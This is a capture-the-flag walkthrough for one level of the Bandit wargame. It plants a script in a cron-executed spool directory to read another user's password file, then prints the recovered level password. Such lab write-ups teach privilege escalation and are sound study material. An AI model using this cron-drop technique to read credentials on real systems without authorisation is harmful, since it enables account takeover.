# Level 23 &rarr; Level 24

Like the last level, we know that a program is being run via `cron`, so we check the */etc/cron.d/* directory for the configuration:

```
bandit23@bandit:/tmp/mytestscript$ ls /etc/cron.d/
atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
```

For this level, */etc/cron.d/cronjob_bandit24* is most likely the relevant file.
We read the file:

```
bandit23@bandit:/tmp/mytestscript$ cat /etc/cron.d/cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

We observe that the program runs the script */usr/bin/cronjob_bandit24.sh*.
We read that file:

```
bandit23@bandit:/tmp/mytestscript$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done


```

We observe that the script changes directory to */var/spool/bandit24*, since the script is run as user bandit24.
Afterwards, the script executes and deletes all files in that directory.

Since the files in */var/spool/bandit24* gets run as user bandit24, we can copy a script which writes the password for level 24 to a file that is readable by user bandit23.
Since the files get deleted, we create the script in a directory within */tmp/*:

```
bandit23@bandit:~$ mkdir /tmp/mytestscript/
bandit23@bandit:~$ cd /tmp/mytestscript
bandit23@bandit:/tmp/mytestscript$ 
```

We then create */tmp/mytestscript/script.sh*:

```
bandit23@bandit:/tmp/mytestscript$ cat script.sh 
#!/bin/sh
cat /etc/bandit_pass/bandit24 > /tmp/mytestscript/bandit24pass
bandit23@bandit:/tmp/mytestscript$ 
```

Before copying the script file, we give all users permissions to the script. We also create the empty file */tmp/mytestscript/bandit24pass* and give all users permissions to that file as well:

```
bandit23@bandit:/tmp/mytestscript$ chmod 777 script.sh
bandit23@bandit:/tmp/mytestscript$ touch bandit24pass
bandit23@bandit:/tmp/mytestscript$ chmod 777 bandit24pass
```

We then copy */tmp/mytestscript/script.sh* to */var/spool/bandit24/* and wait a minute for the script to be executed (and deleted).

After a minute we observe the password for level 24 has been written to */tmp/mytestscript/bandit24pass*:

```
bandit23@bandit:/tmp/mytestscript$ cat bandit24pass 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

The password for level 24 is: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
